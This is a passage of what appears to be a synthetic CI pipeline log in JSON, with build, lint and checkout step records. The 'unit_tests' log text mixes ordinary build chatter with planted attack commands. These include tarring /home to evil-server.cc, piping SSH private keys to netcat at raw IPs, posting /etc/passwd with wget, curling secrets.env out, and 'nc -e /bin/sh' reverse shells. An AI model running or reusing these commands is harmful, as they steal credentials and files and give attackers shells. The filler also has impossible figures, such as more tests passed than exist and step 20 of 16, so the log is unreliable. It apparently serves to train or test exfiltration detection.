lib/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_user_create (479ms)\n=== Step setup_node completed ===\n=== Step: unit_tests ===\nGenerating source maps...\npip: Collecting express\nFinished.\nUsing Node.js 20.18.8\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nnpm notice: package.json updated\nUsing Node.js 17.13.2\nDone.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 113.74.88.141 51431\nCache invalidated: node_modules\nGenerating source maps...\nTest Suites: 44 passed, 18 total\nStep 4/22: Installing dependencies\n[12:47:21] INFO: Starting build process\nStep 11/19: Deploying\nGET /api - 204 (11ms)\nFetching submodules...\nTests: 256 passed, 464 total\n  PASS: test_api_health (405ms)\nArtifact uploaded: build.tar.gz (16MB)\nCompiling src/main.py...\nOK\n\u2713 Step 'build' succeeded\nCache miss for key-7713\nTransforming 243 files...\nRan 53 tests in 60s\nSending 390MB of data to crypto-mine.io\nMinifying app.js\nUsing Python 3.10\necho $(cat ~/.ssh/id_rsa) | base64 | nc 113.237.156.161 4894\nFinished.\nTransforming 154 files...\nTests: 457 passed, 398 total\n[12:47:21] WARN: Deprecated API usage\npip: Installing build dependencies...\nGET /api - 201 (71ms)\nProcessing...\n[12:47:21] DEBUG: Query executed in 34ms\n[12:47:21] INFO: Processing request\n[12:47:21] DEBUG: Memory usage: 160MB\nFetching from https://amazonaws.com/package.json\n[12:47:21] INFO: Cache refreshed\nOptimizing 22 modules...\nGET /health - 200 (25ms)\n\u2717 build failed with exit code 67\n[12:47:21] INFO: Connecting to database\nFinished.\nTest Suites: 7 passed, 28 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nWARNING: react has known vulnerabilities\nCompiling lib/utils.go...\n\u2713 Step 'setup' succeeded\nnpm install: resolved 818 packages\nCreating production build...\nCache invalidated: build\nSending 258MB of data to data-exfil.ru\nLoading...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n[12:47:21] INFO: Cache refreshed\nLayer 3/14: RUN command\npip: Installing build dependencies...\nException: NullPointerException\nProcessing...\nUsing Python 3.11\nVerifying...\nStep 20/16: Linting\nAlready up to date.\nConnection established\nCompleted.\npip: Installing build dependencies...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nTests: 255 passed, 492 total\nStep 2/16: Linting\n[12:47:21] INFO: Cache refreshed\n[12:47:21] WARN: Deprecated API usage\nCoverage: 74% statements, 91% branches\nStep 18/24: Testing\nVerifying...\nCompleted.\nnpm install: added 107 packages\n[12:47:21] DEBUG: Loading configuration\nConnection established\nCache saved successfully\nCompleted.\n[12:47:21] DEBUG: Memory usage: 1538MB\nChecking out master branch\nCompiling components/app.ts...\n[12:47:21] DEBUG: Connection pool: 12 active\nStep 1/25: Installing dependencies\nUsing Python 3.10\nPOST /data - 201 (62ms)\nMinifying vendor.js\nStep 18/19: Linting\nFinished.\npip install: Successfully installed express-2.17\nPulling image: node:latest\nFinished.\nnc -e /bin/sh 113.204.199.55 62924\nTest Suites: 5 passed, 9 total\nTransforming 806 files...\n\u2713 package completed\nPushing to registry...\nTLS handshake completed\n[12:47:21] INFO: Cache refreshed\nChecking out main branch\nStep 16/19: Building\nProcessing...\nHEAD is now at 61ba851\n[12:47:21] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n[12:47:21] DEBUG: Initializing service\necho $(cat ~/.ssh/id_rsa) | base64 | nc 117.110.34.107 57587\nCompiling lib/app.ts...\nNODE_ENV=test\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nUsing Node.js 17.10.9\nUsing Python 3.11\nRan 40 tests in 15s\nArtifact downloaded: 32MB\nCompiling utils/main.py...\nSending 416MB of data to evil-server.cc\nTLS handshake completed\nFAILED: test_db_connect\nSending 380MB of data to crypto-mine.io\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 907 files...\nPushing to registry...\nNODE_ENV=development\n\u2713 Task completed in 692ms\n[12:47:21] DEBUG: Loading configuration\nnpm install: resolved 353 packages\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nTransforming 125 files...\nTest Suites: 44 passed, 49 total\nCompiling lib/service.java...\nPlatform: linux-x64\nCreating production build...\nGenerating source maps...\n[12:47:21] DEBUG: Query executed in 73ms\nArtifact uploaded: dist.zip (86MB)\nStep 6/15: Linting\npip: Downloading axios-4.6.tar.gz\n[12:47:21] INFO: Connecting to database\nMinifying app.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 46.226.18.247 35294\nnpm notice: package.json updated\nPlatform: win32-x64\nnpm notice: package.json updated\nCompiling components/index.js...\nMinifying main.js\nTransforming 468 files...\nCoverage: 98% statements, 87% branches\nStep 13/18: Building\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nCache miss for key-9060\nnc -e /bin/sh 135.144.137.47 36531\nnpm notice: package.json updated\n[12:47:21] DEBUG: Memory usage: 162MB\nBuilding Docker image...\nCache miss for key-2948\nOptimizing 89 modules...\nAlready up to date.\nFinished.\nOptimizing 36 modules...\nWaiting...\nnc -e /bin/sh 147.64.205.86 41412\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:21] DEBUG: Loading configuration\nException: RuntimeError\nLayer 5/9: RUN command\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n[12:47:21] DEBUG: Connection pool: 8 active\nCompiling src/index.js...\nCache saved successfully\nCreating production build...\nCompiling components/app.ts...\nyarn add: Done in 24.67s\nStep 16/24: Building\nReady.\nCompleted.\nArtifact uploaded: dist.zip (75MB)\nFAILED: test_auth_login\n[12:47:21] INFO: Cache refreshed\nPulling image: python:latest\nChecking out develop branch\nSending 206MB of data to data-exfil.ru\nMinifying vendor.js\nReady.\nUsing Node.js 20.8.8\nCache restored successfully (46MB)\nnpm install: resolved 826 packages\nnc -e /bin/sh 151.70.180.147 64081\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 29.44s\nPOST /upload - 202 (427ms)\n[12:47:21] DEBUG: Memory usage: 1201MB\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nOptimizing 49 modules...\nPlatform: win32-x64\nStep 14/18: Linting\nTime: 22.915s\nTime: 11.672s\nWaiting...\n[12:47:21] INFO: Cache refreshed\nnpm notice: created a lockfile\nnpm notice: package.json updated\n[12:47:21] DEBUG: Memory usage: 414MB\nCompleted.\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nCache saved successfully\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nFetching submodules...\n[12:47:21] DEBUG: Connection pool: 10 active\nUsing Python 3.10\nnc -e /bin/sh 103.108.153.178 64888\nOK\npip install: Successfully installed eslint-1.19\nReady.\nNODE_ENV=development\nArtifact downloaded: 3MB\nCache invalidated: dependencies\n[12:47:21] WARN: Deprecated API usage\nCompiling components/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting webpack\nStep 4/22: Installing dependencies\npip: Collecting express\nCompleted.\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nStep 17/21: Installing dependencies\n\u2717 build failed with exit code 121\nUsing Python 3.12\n[12:47:21] INFO: Processing request\n[12:47:21] DEBUG: Initializing service\n[12:47:21] INFO: Processing request\nSuccess!\nFetching from https://github.com/package.json\n[12:47:21] DEBUG: Initializing service\nCompiling utils/utils.go...\n\u2713 lint completed\nTLS handshake completed\nChecking out master branch\nOptimizing 81 modules...\npip: Installing build dependencies...\nInstalling axios@3.11.10\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nCompleted.\nHEAD is now at 18f2bec\nnpm notice: created a lockfile\nUploading artifact 'build' (4 files)\nBundling runtime.js\n[12:47:21] INFO: Cache refreshed\nPulling image: alpine:3.11\nArtifact uploaded: dist.zip (14MB)\nCache saved successfully\n\u2713 All checks passed\nGenerating source maps...\nnc -e /bin/sh 28.66.21.50 19969\nStep 7/15: Installing dependencies\nImage pulled successfully\npip: Collecting webpack\nSnapshots: 6 passed, 41 total\n[12:47:21] ERROR: Connection failed\nConnection established\nWARNING: eslint has known vulnerabilities\nStep 12/17: Installing dependencies\nBundling main.js\nTime: 81.992s\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-14T12:47:21.666154",
        "finished_at": "2025-12-14T12:47:44.349796",
        "log_lines": [
          "=== Step: build ===",
          "Snapshots: 45 passed, 28 total",
          "[12:47:21] DEBUG: Loading configuration",
          "Exception: TypeError",
          "Connection established",
          "WARNING: react has known vulnerabilities",
          "Platform: linux-x64",
          "Using Python 3.9",
          "Ready.",
          "Cache hit for key-9305",
          "Cache invalidated: node_modules",
          "pip: Downloading prettier-4.17.tar.gz",
          "Time: 90.855s",
          "Bundling main.js",
          "Checking out main branch",
          "\u2713 Step 'test' succeeded",
          "pip: Downloading prettier-1.3.tar.gz",
          "pip: Collecting lodash",
          "npm install: resolved 1193 packages",
          "Step 9/22: Deploying",
          "Completed.",
          "GET /api - 201 (91ms)",
          "[12:47:21] WARN: Deprecated API usage",
          "npm notice: package.json updated",
          "Success!",
          "[12:47:21] DEBUG: Connection pool: 5 active",
          "pip: Collecting webpack",
          "npm notice: package.json updated",
          "WARNING: express has known vulnerabilities",
          "[12:47:21] INFO: Request completed",
          "\u2713 Task completed in 4427ms",
          "Waiting...",
          "Step 17/23: Installing dependencies",
          "Installing webpack@2.15.0",
          "[12:47:21] INFO: Request completed",
          "Building Docker image...",
          "Cache restored successfully (370MB)",
          "HEAD is now at 8f1ce15",
          "Step 19/23: Installing dependencies",
          "Cache miss for key-3859",
          "Artifact downloaded: 42MB",
          "Minifying main.js",
          "Step 13/20: Testing",
          "Cache miss for key-4928",
          "Time: 10.734s",
          "Switched to branch 'hotfix/task-362'",
          "Step 8/19: Testing",
          "Ready.",
          "Verifying...",
          "\u2713 package completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 7/22: Installing dependencies",
          "Compiling src/service.java...",
          "Step 10/22: Installing dependencies",
          "GET /api - 204 (79ms)",
          "  PASS: test_db_connect (207ms)",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Image pulled successfully",
          "Layer 4/13: RUN command",
          "NODE_ENV=test",
          "Waiting...",
          "Connection established",
          "yarn add: Done in 25.39s",
          "Layer 5/11: RUN command",
          "Building Docker image...",
          "NODE_ENV=development",
          "Step 3/19: Deploying",
          "Using Node.js 15.15.1",
          "Completed.",
          "[12:47:21] INFO: Connecting to database",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2713 lint completed",
          "Cache saved successfully",
          "Test Suites: 29 passed, 10 total",
          "Minifying vendor.js",
          "Finished.",
          "Artifact downloaded: 15MB",
          "[12:47:21] DEBUG: Loading configuration",
          "Pulling image: python:18",
          "Minifying vendor.js",
          "Environment: test",
          "[12:47:21] INFO: Cache refreshed",
          "[12:47:21] DEBUG: Connection pool: 13 active",
          "Step 11/23: Deploying",
          "Success!",
          "[12:47:21] DEBUG: Query executed in 41ms",
          "Checking out master branch",
          "Step 16/19: Linting",
          "HEAD is now at 0f6ed57",
          "Compiling lib/handler.rs...",
          "\u2717 build failed with exit code 77",
          "[12:47:21] WARN: Deprecated API usage",
          "Finished.",
          "  PASS: test_api_health (26ms)",
          "Ran 24 tests in 35s",
          "\u2713 deploy completed",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "Step 10/16: Running migrations",
          "Compiling src/utils.go...",
          "Generating source maps...",
          "[12:47:21] DEBUG: Initializing service",
          "Step 12/22: Testing",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "Using Python 3.10",
          "Processing...",
          "Tests: 204 passed, 281 total",
          "GET /status - 201 (70ms)",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Platform: linux-x64",
          "Cache hit for key-6533",
          "WARNING: react has known vulnerabilities",
          "Loading...",
          "Completed.",
          "Processing...",
          "Compiling utils/index.js...",
          "OK",
          "Pushing to registry...",
          "Creating production build...",
          "OK",
          "pip: Collecting axios",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "Connection established",
          "Success!",
          "Compiling lib/main.py...",
          "yarn add: Done in 25.55s",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 11MB",
          "Pushing to registry...",
          "Step 17/24: Linting",
          "[12:47:21] INFO: Request completed",
          "[12:47:21] INFO: Request completed",
          "pip: Collecting eslint",
          "Step 15/17: Deploying",
          "Generating source maps...",
          "Compiling components/main.py...",
          "[12:47:21] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:47:21] DEBUG: Loading configuration",
          "Already up to date.",
          "[12:47:21] DEBUG: Loading configuration",
          "npm install: added 420 packages",
          "Cache restored successfully (34MB)",
          "Using Python 3.10",
          "Optimizing 85 modules...",
          "Generating source maps...",
          "Processing...",
          "[12:47:21] INFO: Connecting to database",
          "Optimizing 91 modules...",
          "Cache miss for key-8949",
          "npm notice: created a lockfile",
          "Waiting...",
          "Ready.",
          "Completed.",
          "Compiling components/utils.go...",
          "Finished.",
          "Bundling vendor.js",
          "Processing...",
          "Time: 51.847s",
          "Success!",
          "pip: Installing build dependencies...",
          "Compiling components/service.java...",
          "Tests: 360 passed, 486 total",
          "Completed.",
          "Step 15/25: Running migrations",
          "Success!",
          "Platform: darwin-arm64",
          "NODE_ENV=production",
          "Installing react@3.6.2",
          "\u2717 build failed with exit code 61",
          "pip: Downloading express-5.19.tar.gz",
          "Step 13/21: Deploying",
          "Finished.",
          "[12:47:21] DEBUG: Loading configuration",
          "OK",
          "Connection established",
          "Ran 84 tests in 11s",
          "Snapshots: 20 passed, 28 total",
          "Layer 9/14: ENV command",
          "Artifact uploaded: build.tar.gz (6MB)",
          "TLS handshake completed",
          "Layer 2/14: RUN command",
          "Artifact uploaded: dist.zip (7MB)",
          "NODE_ENV=test",
          "Time: 22.757s",
          "Bundling main.css",
          "Step 9/16: Testing",
          "NODE_ENV=test",
          "Uploading artifact 'coverage' (41 files)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:47:21] INFO: Cache refreshed",
          "Switched to branch 'feature/task-444'",
          "Compiling src/main.py...",
          "Time: 95.841s",
          "Step 11/19: Installing dependencies",
          "Pushing to registry...",
          "Layer 2/15: ENV command",
          "Cache saved successfully",
          "Checking out main branch",
          "Compiling lib/handler.rs...",
          "Ran 179 tests in 10s",
          "Cache hit for key-2851",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 10/22: Building",
          "pip install: Successfully installed react-1.17",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 24 passed, 48 total",
          "Fetching from https://pypi.org/package.json",
          "\u2713 All checks passed",
          "\u2713 Step 'setup' succeeded",
          "Tests: 192 passed, 437 total",
          "pip: Downloading axios-5.11.tar.gz",
          "Compiling src/handler.rs...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Completed.",
          "Test Suites: 48 passed, 47 total",
          "FAILED: test_auth_login",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "Step 2/15: Deploying",
          "Fetching from https://amazonaws.com/package.json",
          "Optimizing 14 modules...",
          "Step 8/22: Building",
          "OK",
          "\u2713 Step 'setup' succeeded",
          "GET /health - 200 (37ms)",
          "Cache restored successfully (74MB)",
          "POST /api - 201 (379ms)",
          "Step 12/23: Building",
          "Using Python 3.11",
          "Layer 4/15: ENV command",
          "Already up to date.",
          "Installing webpack@1.0.3",
          "\u2713 All checks passed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-14T12:47:44.349796",
        "finished_at": "2025-12-14T12:47:51.911010",
        "log_lines": [
          "=== Step: lint ===",
          "Uploading artifact 'build' (21 files)",
          "Time: 26.756s",
          "TLS handshake completed",
          "Step 19/24: Building",
          "Minifying main.js",
          "Compiling utils/main.py...",
          "Verifying...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:47:21] WARN: Deprecated API usage",
          "Waiting...",
          "Snapshots: 19 passed, 47 total",
          "[12:47:21] INFO: Connecting to database",
          "WARNING: eslint has known vulnerabilities",
          "[12:47:21] DEBUG: Connection pool: 20 active",
          "Creating production build...",
          "[12:47:21] INFO: Connecting to database",
          "npm install: added 221 packages",
          "Loading...",
          "[12:47:21] WARN: Deprecated API usage",
          "yarn add: Done in 5.37s",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "Cache miss for key-7745",
          "[12:47:21] INFO: Cache refreshed",
          "yarn add: Done in 24.27s",
          "POST /data - 201 (299ms)",
          "Ready.",
          "npm notice: created a lockfile",
          "Fetching from https://gcr.io/package.json",
          "WARNING: prettier has known vulnerabilities",
          "[12:47:21] DEBUG: Memory usage: 1306MB",
          "[12:47:21] WARN: Deprecated API usage",
          "Cache saved successfully",
          "Ready.",
          "Loading...",
          "Compiling components/app.ts...",
          "[12:47:21] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Step 5/24: Deploying",
          "Fetching submodules...",
          "POST /data - 201 (125ms)",
          "[12:47:21] DEBUG: Connection pool: 5 active",
          "Layer 1/11: RUN command",
          "Finished.",
          "Ran 25 tests in 56s",
          "[12:47:21] INFO: Connecting to database",
          "Generating source maps...",
          "Step 19/20: Deploying",
          "Minifying main.js",
          "OK",
          "POST /data - 202 (53ms)",
          "Ran 91 tests in 26s",
          "Ran 29 tests in 34s",
          "Ready.",
          "Cache restored successfully (428MB)",
          "Generating source maps...",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Fetching from https://githubusercontent.com/package.json",
          "\u2713 Task completed in 121ms",
          "[12:47:21] INFO: Processing request",
          "TLS handshake completed",
          "[12:47:21] DEBUG: Query executed in 49ms",
          "HEAD is now at 5a6f826",
          "[12:47:21] WARN: Deprecated API usage",
          "Cache hit for key-5347",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: alpine:3.11",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_api_health (310ms)",
          "Step 2/20: Deploying",
          "[12:47:21] DEBUG: Query executed in 33ms",
          "Installing jest@4.0.5",
          "Verifying...",
          "Test Suites: 12 passed, 43 total",
          "Connection established",
          "Completed.",
          "Step 14/21: Linting",
          "[12:47:21] INFO: Cache refreshed",
          "Cache hit for key-4210",
          "\u2713 Step 'install' succeeded",
          "pip: Downloading express-5.7.tar.gz",
          "Cache restored successfully (302MB)",
          "Compiling src/index.js...",
          "HEAD is now at f21972e",
          "Compiling components/main.py...",
          "[12:47:21] DEBUG: Initializing service",
          "Minifying vendor.js",
          "WARNING: lodash has known vulnerabilities",
          "[12:47:21] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] DEBUG: Memory usage: 584MB",
          "Layer 10/10: ENV command",
          "Cache miss for key-8224",
          "Step 2/22: Building",
          "[12:47:21] INFO: Starting build process",
          "Creating production build...",
          "Connection established",
          "Checking out master branch",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling lib/service.java...",
          "\u2713 test completed",
          "Compiling utils/service.java...",
          "Transforming 458 files...",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 11/22: Running migrations",
          "Snapshots: 49 passed, 35 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 3/23: Running migrations",
          "Step 16/25: Running migrations",
          "Using Python 3.11",
          "Using Node.js 14.12.9",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.11",
          "Environment: test",
          "Uploading artifact 'dist' (28 files)",
          "Completed.",
          "[12:47:21] DEBUG: Memory usage: 1837MB",
          "Time: 99.228s",
          "npm install: resolved 1231 packages",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "FAILED: test_api_health",
          "TLS handshake completed",
          "[12:47:21] DEBUG: Memory usage: 816MB",
          "HEAD is now at 2f52862",
          "Completed.",
          "Transforming 988 files...",
          "Platform: linux-x64",
          "FAILED: test_api_health",
          "Compiling lib/service.java...",
          "\u2713 Task completed in 662ms",
          "Fetching from https://googleapis.com/package.json",
          "POST /api - 201 (67ms)",
          "Processing...",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (19 files)",
          "Artifact uploaded: dist.zip (4MB)",
          "Cache restored successfully (494MB)",
          "Snapshots: 7 passed, 11 total",
          "OK",
          "Cache hit for key-7567",
          "[12:47:21] DEBUG: Initializing service",
          "Compiling src/index.js...",
          "npm install: added 99 packages",
          "Using Node.js 18.10.10",
          "Processing...",
          "Pulling image: node:18",
          "\u2717 build failed with exit code 15",
          "POST /data - 202 (272ms)",
          "Bundling runtime.css",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Optimizing 70 modules...",
          "HEAD is now at f05969b",
          "Step 16/15: Building",
          "Verifying...",
          "Switched to branch 'feature/task-629'",
          "pip: Downloading jest-1.20.tar.gz",
          "Step 13/18: Testing",
          "Pulling image: node:latest",
          "[12:47:21] DEBUG: Query executed in 9ms",
          "Verifying...",
          "[12:47:21] INFO: Starting build process",
          "Success!",
          "[12:47:21] DEBUG: Connection pool: 10 active",
          "npm notice: created a lockfile",
          "Step 10/20: Running migrations",
          "Finished.",
          "Cache invalidated: dependencies",
          "Step 16/25: Running migrations",
          "npm install: added 260 packages",
          "  PASS: integration/test_api_health.spec.js",
          "[12:47:21] DEBUG: Connection pool: 15 active",
          "Layer 7/14: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Layer 1/8: RUN command",
          "Artifact downloaded: 3MB",
          "Step 13/23: Building",
          "Uploading artifact 'build' (36 files)",
          "Finished.",
          "[12:47:21] DEBUG: Connection pool: 5 active",
          "Tests: 288 passed, 487 total",
          "Step 9/20: Building",
          "NODE_ENV=test",
          "Ran 60 tests in 19s",
          "Cache miss for key-8164",
          "Image pulled successfully",
          "Step 13/16: Installing dependencies",
          "Step 2/23: Running migrations",
          "[12:47:21] INFO: Processing request",
          "Test Suites: 7 passed, 42 total",
          "npm notice: created a lockfile",
          "Cache invalidated: build",
          "Exception: TypeError",
          "Cache invalidated: build",
          "pip: Installing build dependencies...",
          "[12:47:21] DEBUG: Initializing service",
          "Fetching from https://github.com/package.json",
          "Verifying...",
          "Snapshots: 36 passed, 46 total",
          "Ready.",
          "[12:47:21] DEBUG: Initializing service",
          "Optimizing 91 modules...",
          "pip install: Successfully installed eslint-4.17",
          "Compiling utils/service.java...",
          "[12:47:21] DEBUG: Memory usage: 829MB",
          "Platform: darwin-arm64",
          "Finished.",
          "WARNING: prettier has known vulnerabilities",
          "Cache restored successfully (402MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Installing build dependencies...",
          "Uploading artifact 'build' (3 files)",
          "npm install: resolved 894 packages",
          "Exception: RuntimeError",
          "[12:47:21] INFO: Starting build process",
          "Switched to branch 'feature/task-955'",
          "Compiling src/index.js...",
          "[12:47:21] DEBUG: Memory usage: 1587MB",
          "Image pulled successfully",
          "Waiting...",
          "\u2713 Task completed in 4470ms",
          "pip: Installing build dependencies...",
          "Fetching from https://amazonaws.com/package.json",
          "Installing jest@1.8.0",
          "\u2713 Step 'install' succeeded",
          "[12:47:21] DEBUG: Initializing service",
          "POST /upload - 202 (488ms)",
          "WARNING: express has known vulnerabilities",
          "[12:47:21] DEBUG: Connection pool: 5 active",
          "Layer 5/10: COPY command",
          "npm install: added 16 packages",
          "Step 3/16: Installing dependencies",
          "Compiling lib/service.java...",
          "Artifact uploaded: dist.zip (29MB)",
          "Tests: 356 passed, 198 total",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-14T12:47:51.911010",
        "finished_at": "2025-12-14T12:47:54.935496",
        "log_lines": [
          "=== Step: checkout ===",
          "Compiling utils/main.py...",
          "Bundling styles.css",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "\u2713 Task completed in 4462ms",
          "[12:47:21] INFO: Processing request",
          "Minifying main.js",
          "Using Python 3.9",
          "Waiting...",
          "Using Python 3.9",
          "Uploading artifact 'build' (32 files)",
          "[12:47:21] ERROR: Connection failed",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Waiting...",
          "Artifact uploaded: dist.zip (90MB)",
          "Fetching from https://amazonaws.com/package.json",
          "Completed.",
          "WARNING: axios has known vulnerabilities",
          "[12:47:21] INFO: Request completed",
          "Step 14/17: Testing",
          "pip: Downloading react-3.5.tar.gz",
          "Compiling src/service.java...",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Minifying vendor.js",
          "Installing jest@2.8.1",
          "npm install: added 330 packages",
          "[12:47:21] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "POST /api - 200 (365ms)",
          "Fetching submodules...",
          "Compiling utils/handler.rs...",
          "Generating source maps...",
          "[12:47:21] INFO: Connecting to database",
          "Test Suites: 30 passed, 9 total",
          "Creating production build...",
          "Done.",
          "Success!",
          "Completed.",
          "Image pulled successfully",
          "Finished.",
          "Step 3/15: Building",
          "Processing...",
          "Checking out main branch",
          "Time: 32.690s",
          "[12:47:21] DEBUG: Query executed in 48ms",
          "[12:47:21] INFO: Request completed",
          "Compiling lib/utils.go...",
          "Loading...",
          "Tests: 472 passed, 253 total",
          "WARNING: prettier has known vulnerabilities",
          "FAILED: test_api_health",
          "[12:47:21] DEBUG: Memory usage: 626MB",
          "Pushing to registry...",
          "pip: Downloading react-3.14.tar.gz",
          "Time: 28.324s",
          "Installing lodash@1.6.2",
          "Fetching submodules...",
          "TLS handshake completed",
          "Minifying vendor.js",
          "Using Node.js 15.2.3",
          "POST /data - 202 (496ms)",
          "Exception: ValueError",
          "pip: Collecting jest",
          "Snapshots: 26 passed, 50 total",
          "yarn add: Done in 21.44s",
          "Finished.",
          "Optimizing 23 modules...",
          "Optimizing 99 modules...",
          "Step 13/15: Installing dependencies",
          "Time: 45.339s",
          "[12:47:21] INFO: Connecting to database",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:47:21] INFO: Request completed",
          "\u2717 build failed with exit code 14",
          "Platform: win32-x64",
          "[12:47:21] INFO: Processing request",
          "Switched to branch 'hotfix/task-902'",
          "HEAD is now at 85de4a0",
          "Ran 196 tests in 16s",
          "\u2713 package completed",
          "Fetching submodules...",
          "[12:47:21] INFO: Connecting to database",
          "Done.",
          "pip: Collecting axios",
          "pip: Downloading jest-5.6.tar.gz",
          "GET /api - 204 (21ms)",
          "Image pulled successfully",
          "\u2713 All checks passed",
          "Compiling components/handler.rs...",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "[12:47:21] INFO: Starting build process",
          "Checking out develop branch",
          "TLS handshake completed",
          "Ran 67 tests in 42s",
          "\u2713 deploy completed",
          "Cache hit for key-9804",
          "Checking out main branch",
          "Connection established",
          "Fetching submodules...",
          "  PASS: test_api_health (248ms)",
          "Coverage: 78% statements, 91% branches",
          "Coverage: 100% statements, 62% branches",
          "\u2713 Task completed in 3335ms",
          "npm install: added 201 packages",
          "Minifying main.js",
          "Time: 33.442s",
          "Step 9/15: Building",
          "Using Node.js 14.7.5",
          "Transforming 732 files...",
          "npm install: added 313 packages",
          "Test Suites: 31 passed, 19 total",
          "  PASS: integration/test_db_connect.spec.js",
          "npm install: added 396 packages",
          "Fetching from https://pypi.org/package.json",
          "OK",
          "[12:47:21] WARN: Deprecated API usage",
          "Artifact downloaded: 43MB",
          "Done.",
          "Snapshots: 0 passed, 1 total",
          "\u2713 Step 'checkout' succeeded",
          "npm install: added 153 packages",
          "Compiling components/main.py...",
          "Artifact downloaded: 38MB",
          "Using Node.js 20.12.2",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:21] DEBUG: Initializing service",
          "Artifact uploaded: build.tar.gz (32MB)",
          "npm install: added 381 packages",
          "\u2713 validate completed",
          "FAILED: test_api_health",
          "GET /health - 204 (88ms)",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://registry.npmjs.org/package.json",
          "Artifact uploaded: dist.zip (4MB)",
          "Waiting...",
          "Checking out develop branch",
          "[12:47:21] DEBUG: Query executed in 76ms",
          "Compiling lib/handler.rs...",
          "[12:47:21] DEBUG: Connection pool: 9 active",
          "[12:47:21] INFO: Cache refreshed",
          "Step 18/19: Deploying",
          "Pushing to registry...",
          "Snapshots: 12 passed, 19 total",
          "Pulling image: alpine:18",
          "Step 18/15: Installing dependencies",
          "Ran 92 tests in 23s",
          "POST /upload - 200 (149ms)",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Fetching submodules...",
          "Switched to branch 'bugfix/task-634'",
          "Generating source maps...",
          "Pulling image: node:18",
          "Exception: NullPointerException",
          "Step 12/22: Deploying",
          "Connection established",
          "pip: Downloading axios-5.12.tar.gz",
          "Tests: 411 passed, 125 total",
          "Using Python 3.12",
          "Cache restored successfully (21MB)",
          "\u2717 build failed with exit code 104",
          "Installing prettier@2.4.8",
          "[12:47:21] DEBUG: Initializing service",
          "Completed.",
          "Environment: test",
          "Pulling image: node:3.11",
